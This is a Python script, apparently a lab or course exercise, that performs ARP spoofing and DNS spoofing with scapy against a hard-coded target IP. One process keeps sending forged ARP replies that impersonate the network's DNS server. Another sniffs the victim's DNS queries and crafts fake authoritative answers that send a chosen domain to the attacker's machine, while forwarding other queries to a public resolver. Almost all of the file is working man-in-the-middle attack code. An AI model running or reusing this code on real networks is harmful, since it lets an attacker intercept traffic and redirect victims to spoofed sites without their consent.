from typing import Dict, List
import multiprocessing as mp
from scapy.layers.l2 import getmacbyip, Ether, ARP
from scapy.layers.dns import DNS, DNSQR, DNSRR, IP, sr1, UDP
import scapy.all as scapy
import time

from scapy.sendrecv import sendp, sr

DOOFENSHMIRTZ_IP = "132.64.143.191"  # Enter the computer you attack's IP.
SECRATERY_IP = "127.0.0.1"  # Enter the attacker's IP.
NETWORK_DNS_SERVER_IP = "132.64.143.7"  # Enter the network's DNS server's IP.
SPOOF_SLEEP_TIME = 2

IFACE = "Ethernet"  # Enter the network interface you work on.

FAKE_GMAIL_IP = SECRATERY_IP  # The ip on which we run
DNS_FILTER = f"udp port 53 and ip src {DOOFENSHMIRTZ_IP} and ip dst {NETWORK_DNS_SERVER_IP}"  # Scapy filter
RONEN_SHEKEL_DNS_SERVER = "8.8.8.8"  # The server we use to get real DNS responses.
SPOOF_DICT = {  # This dictionary tells us which urls/ips our DNS server needs to fake.
    b"www.tv.com": FAKE_GMAIL_IP
}


class ArpSpoofer(object):
    """
    An ARP Spoofing process. Sends periodical ARP responses to given target
    in order to convince it we are a specific ip (e.g: default gateway).
    """

    def __init__(self,
                 process_list: List[mp.Process],
                 target_ip: str, spoof_ip: str) -> None:
        """
        Initializer for the arp spoofer process.
        @param process_list global list of processes to append our process to.
        @param target_ip ip to spoof
        @param spoof_ip ip we want to convince the target we have.
        """
        process_list.append(self)
        self.process = None

        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.target_mac = None
        self.spoof_count = 0

    def get_target_mac(self) -> str:
        """
        Returns the mac address of the target.
        If not initialized yet, sends an ARP request to the target and waits for a response.
        @return the mac address of the target.
        """
        self.target_mac = getmacbyip(self.target_ip)
        if self.target_mac is not None:
            return self.target_mac

        ans = scapy.sr1(ARP(pdst=self.target_ip, op="who-has"), verbose=0, iface=IFACE).hwsrc
        return ans

    def spoof(self) -> None:
        """
        Sends an ARP spoof that #convinces target_ip that we are spoof_ip.
        Increases spoof count b y one.
        """

        target_mac = self.get_target_mac()
        arp_response = ARP(pdst=self.target_ip, hwdst=target_mac, psrc=self.spoof_ip, op='is-at')
        sendp(arp_response, verbose=0)
        if True:
            self_mac = ARP().hwsrc
            print("[+] Sent to {} : {} is-at {}".format(self.target_ip, self.spoof_ip, self_mac))

        self.spoof_count += 1

    def run(self) -> None:
        """
        Main loop of the process.
        """
        while True:
            self.spoof()
            time.sleep(SPOOF_SLEEP_TIME)

    def start(self) -> None:
        """
        Starts the ARP spoof process.
        """
        p = mp.Process(target=self.run)
        self.process = p
        self.process.start()


class DnsHandler(object):
    """
    A DNS request server process. Forwards some of the DNS requests to the
    default servers. However for specific domains this handler returns fake crafted
    DNS responses.
    """

    def __init__(self,
                 process_list: List[mp.Process],
                 spoof_dict: Dict[str, str]):
        """
        Initializer for the dns server process.
        @param process_list global list of processes to append our process to.
        @param spoof_dict dictionary of spoofs.
            The keys: represent the domains we wish to fake,
            The values: represent the fake responses we want
                        from the domains.
        """
        process_list.append(self)
        self.process = None

        self.spoof_dict = spoof_dict
        self.dns_server_ip = RONEN_SHEKEL_DNS_SERVER

    def get_real_dns_response(self, pkt: scapy.packet.Packet) -> scapy.packet.Packet:
        """
        Returns the real DNS response to the given DNS request.
        Calls the default DNS servers (8.8.8.8) and forwards the response, only modifying
        the IP (change it to local IP).

        @param pkt DNS request from target.
        @return DNS response to pkt, source IP changed.
        """
        print(f"Forwarding: {pkt[DNSQR].qname}")
        response = sr1(
            IP(dst=self.dns_server_ip) /
            UDP(sport=pkt[UDP].sport) /
            DNS(rd=1, id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname)),
            verbose=0,
        )
        resp_pkt = IP(dst=pkt[IP].src, src=SECRATERY_IP) / UDP(dport=pkt[UDP].sport) / DNS()
        resp_pkt[DNS] = response[DNS]
        return resp_pkt

    #        send(resp_pkt, verbose=0)

    def get_spoofed_dns_response(self, pkt: scapy.packet.Packet, to: str) -> scapy.packet.Packet:
        """
        Returns a fake DNS response to the given DNS request.
        Crafts a DNS response leading to the ip adress 'to' (parameter).

        @param pkt DNS request from target.
        @param to ip address to return from the DNS lookup.
        @return fake DNS response to the request.
        """
        # Construct the DNS packet
        # Construct the Ethernet header by looking at the sniffed packet
        eth = Ether(
            src=pkt[Ether].dst,
            dst=pkt[Ether].src
        )

        # Construct the IP header by looking at the sniffed packet
        ip = IP(
            src=pkt[IP].dst,
            dst=pkt[IP].src
        )

        # Construct the UDP header by looking at the sniffed packet
        udp = UDP(
            dport=pkt[UDP].sport,
            sport=pkt[UDP].dport
        )

        # Construct the DNS response by looking at the sniffed packet and manually
        dns = DNS(
            id=pkt[DNS].id,
            qd=pkt[DNS].qd,
            aa=1,
            rd=0,
            qr=1,
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=0,
            ar=DNSRR(
                rrname=pkt[DNS].qd.qname,
                type='A',
                ttl=600,
                rdata=to)
        )

        # Put the full packet together
        response_packet = eth / ip / udp / dns

        # Send the DNS response
        # sendp(response_packet, iface=IFACE)
        return response_packet

    def resolve_packet(self, pkt: scapy.packet.Packet) -> scapy.packet.Packet:
        """
        Main handler for DNS requests. Based on the spoof_dict, decides if the packet
        should be forwarded to DNS_SERVER_IP (default DNS server) or should be treated
        with a crafted response. Calls get_real_dns_response and get_real_dns_response accordingly.

        @param pkt DNS request from target.
        @return DNS response to packet
        """
        print("start resolve_packet")
        print("qname - ", pkt[DNSQR].qname)
        if pkt[DNSQR].qname in self.spoof_dict:
            response_packet = self.get_spoofed_dns_response(pkt, SPOOF_DICT[pkt[DNSQR].qname])
        else:
            response_packet = self.get_real_dns_response(pkt)
        # sendp(response_packet, iface=IFACE)
        return response_packet

    def run(self) -> None:
        """
        Main loop of the process. Sniffs for packets on the interface and sends DNS
        requests to resolve_packet.
        """
        while True:
            try:
                scapy.sniff(filter=DNS_FILTER, prn=self.resolve_packet)
            except:
                pass

    def start(self) -> None:
        """
        Starts the DNS server process.
        """
        p = mp.Process(target=self.run)
        self.process = p
        self.process.start()


if __name__ == "__main__":
    plist = []
    spoofer = ArpSpoofer(plist, DOOFENSHMIRTZ_IP, NETWORK_DNS_SERVER_IP)
    server = DnsHandler(plist, SPOOF_DICT)

    print("Starting sub-processes...")
    server.start()
    spoofer.start()
